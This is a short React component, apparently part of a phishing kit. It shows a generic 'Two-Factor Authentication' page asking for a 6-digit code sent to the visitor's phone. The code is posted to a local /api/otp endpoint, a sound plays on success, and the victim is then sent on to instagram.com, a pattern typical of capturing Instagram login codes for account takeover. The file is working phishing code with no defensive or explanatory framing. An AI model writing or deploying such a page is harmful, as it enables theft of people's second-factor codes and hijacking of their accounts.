import { useState, useEffect } from 'react';

export default function ViewOtpForm() {
  const [otp, setOtp] = useState('');

  useEffect(() => {
    // Preload the notification sound
    const audio = new Audio('/notify.mp3');
    audio.load();
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();

    const res = await fetch('/api/otp', {
      method: 'POST',
      body: new URLSearchParams({ otp }),
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
    });

    if (res.ok) {
      const audio = new Audio('/notify.mp3');
      audio.play(); // 🔊 Play sound on success
      window.location.href = 'https://www.instagram.com';
    } else {
      alert('❌ OTP submission failed');
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-black text-white">
      <form onSubmit={handleSubmit} className="space-y-4 bg-gray-900 p-6 rounded shadow-lg w-full max-w-md">
        <h1 className="text-xl font-bold text-center">Two-Factor Authentication</h1>
        <p className="text-sm text-gray-400 text-center">Enter the 6-digit code sent to your phone</p>
        <input
          type="text"
          name="otp"
          value={otp}
          onChange={(e) => setOtp(e.target.value)}
          placeholder="Enter OTP"
          maxLength={6}
          className="w-full px-4 py-2 rounded bg-gray-800 border border-gray-700 text-white tracking-widest text-center"
          required
        />
        <button
          type="submit"
          className="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-2 px-4 rounded"
        >
          Continue
        </button>
      </form>
    </div>
  );
}
